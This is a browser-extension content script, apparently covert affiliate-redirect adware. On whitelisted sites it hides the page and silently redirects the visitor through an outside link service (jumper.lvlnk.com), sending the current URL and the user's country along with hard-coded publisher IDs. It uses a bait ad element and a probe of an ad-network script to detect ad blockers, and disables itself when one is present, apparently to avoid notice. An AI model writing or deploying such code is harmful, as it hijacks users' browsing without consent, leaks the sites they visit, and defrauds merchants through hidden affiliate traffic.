const sub_id = 'pp31';
const pub_id = 'imb4wzji';

let wListUCheck = [];

function calculateElapsedSeconds(storedTimestamp) {
	const currentTimestamp = Date.now();
	const elapsedMilliseconds = currentTimestamp - storedTimestamp;
	const elapsedSeconds = Math.floor(elapsedMilliseconds / 1000);
	return elapsedSeconds;
}

function deleteUrlParam(e, a) {
	const n = new URL(e);
	n.searchParams.delete(a); // Supprime complètement le paramètre
	return n.toString();
}

function doThat() {
	const t = window.location.hostname.replace('www.', '');

	// Check if the user already clicked on this root
	chrome.storage.local.get([t, 'lastRootTmp'], function (result) {
		let start;
		const storedData = result[t];
		if (storedData) {
			const lastRootDirect = storedData.lastRootDirect;
			const lastVisiteTimestamp = storedData.lastVisiteTimestamp;

			const elapsedSeconds = calculateElapsedSeconds(lastVisiteTimestamp);
			console.log(`[debug] last jump was ${elapsedSeconds} seconds ago`);

			if (elapsedSeconds > 21600) {
				console.log('[debug] so we jump');
				document.documentElement.style.display = 'none';
				start = true;
			} else {
				console.log('[debug] so we DONT jump');
				start = false;
			}
		} else if (result.lastRootTmp == t) {
			console.log('[debug] not a partner');
			start = false;
		} else {
			console.log('[debug] root never viewed, we check if root in wlist');
			document.documentElement.style.display = 'none';
			start = true;
		}

		if (start == true) {
			// fallback for getting the wlist
			chrome.storage.local.get(['wList'], (value) => {
				wListUCheck = value.wList || {};

				const languageToCountryFallback = {
					en: 'US', // Anglais -> États-Unis
					ja: 'JP', // Japonais -> Japon
					vi: 'VN', // Vietnamien -> Vietnam
					sv: 'SE', // Suédois -> Suède
					el: 'GR', // Grec -> Grèce
					he: 'IL', // Hébreu -> Israël
					cs: 'CZ', // Tchèque -> République Tchèque
					nb: 'NO', // Norvégien (Bokmål) -> Norvège
					419: 'ES',
				};
				const userLanguage = navigator.language;
				const languageParts = userLanguage.split('-');
				let countryCode;
				if (languageParts.length > 1) {
					countryCode = languageParts[1];
				} else {
					countryCode = languageToCountryFallback[languageParts[0]] || languageParts[0];
				}
				countryCode = !countryCode || countryCode.length !== 2 ? 'US' : countryCode;
				countryCode = countryCode.toUpperCase();
				console.log(countryCode);

				if (wListUCheck[t]) {
					const dest =
						'https://jumper.lvlnk.com/?pubId=' +
						pub_id +
						'&country=' +
						countryCode +
						'&subId=' +
						sub_id +
						'&url=' +
						encodeURIComponent(deleteUrlParam(window.location.href, 'srsltid'));

					const lastWebsiteData = {
						[t]: {
							lastRootDirect: t,
							lastVisiteTimestamp: Date.now(),
							debugJumpU: dest,
						},
					};
					chrome.storage.local.set(lastWebsiteData, function () {
						window.location.replace(dest);
					});
				} else {
					// Afficher le contenu de la page
					console.log('not in wlist :', t);
					chrome.storage.local.set({ lastRootTmp: t }, function () {
						//window.location.replace(dest);
					});
					document.documentElement.style.display = '';
				}
			});
		} else {
			console.log('[debug] page already redirect we stop, actual=' + t + ' lastRootDirect=');
			setTimeout(runSum, 1000);
		}
	});
}

function runSum() {
	const square = document.createElement('div');

	square.style.position = 'fixed';
	square.style.bottom = '0';
	square.style.left = '0';
	square.style.width = '1px';
	square.style.height = '1px';
	square.style.backgroundColor = 'red';
	square.style.zIndex = '10000';

	square.className =
		'adsbox ads ad-banner pub_300x250 pub_300x250m pub_728x90 text-ad textAd text_ad text_ads text-ads banner-ad ad-container';

	square.style.display = 'block';
	square.style.visibility = 'visible';
	square.style.border = '1px solid transparent';
	square.style.margin = '0';
	square.style.padding = '0';

	document.body.appendChild(square);

	setTimeout(function () {
		const computedStyle = window.getComputedStyle(square);

		if (
			square.offsetHeight === 0 ||
			square.offsetWidth === 0 ||
			computedStyle.visibility === 'hidden' ||
			computedStyle.display === 'none'
		) {
			chrome.storage.local.set({ activate: false }, function () {
				console.log('activate has been set to false');
			});
			chrome.storage.local.set({ permissionsGranted: false }, function () {
				console.log('permissionsGranted has been set to false');
			});
		} else {
			const testUrl = 'https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js';

			fetch(testUrl, { method: 'HEAD' })
				.then(() => {
					chrome.storage.local.set({ activate: true }, function () {
						console.log("AdBlock n'est pas activé (fetch réussi).");
					});
				})
				.catch(() => {
					chrome.storage.local.set({ permissionsGranted: false }, function () {
						console.log('permissionsGranted has been set to false');
					});
					chrome.storage.local.set({ activate: false }, function () {
						console.log('AdBlock détecté (fetch bloqué).');
					});
				});
		}
	}, 200);
}

chrome.storage.local.get(['permissionsGranted'], function (result) {
	if (result.permissionsGranted !== false) {
		chrome.storage.local.get(['activate'], function (result) {
			if (result.activate === undefined) {
				setTimeout(runSum, 1000);
			} else if (result.activate === true) {
				doThat();
			}
		});
	}
});
